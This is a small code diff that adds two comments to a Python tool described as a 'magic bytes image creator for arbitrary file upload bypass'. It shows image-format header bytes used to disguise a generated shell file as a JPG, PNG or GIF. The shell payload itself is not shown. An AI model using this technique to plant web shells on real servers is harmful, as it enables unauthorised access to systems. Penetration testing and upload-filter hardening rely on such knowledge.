@@ -4,6 +4,7 @@ import argparse
 def generate_shell(output_file, file_type, interactive):
     # Dictionary of magic bytes for different image formats
     magic_bytes = {
+        # hexadecimal bytes for each file type
         "jpg": b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01",
         "png": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
         "gif": b"\x47\x49\x46\x38\x39\x61",
@@ -40,6 +41,7 @@ def generate_shell(output_file, file_type, interactive):
     
     print(f"[+] File created successfully: {output_file}")
 
+# main function for the script
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Magic bytes image creator for arbitrary file upload bypass")
     parser.add_argument("-o", "--output", required=True, help="Output file name")
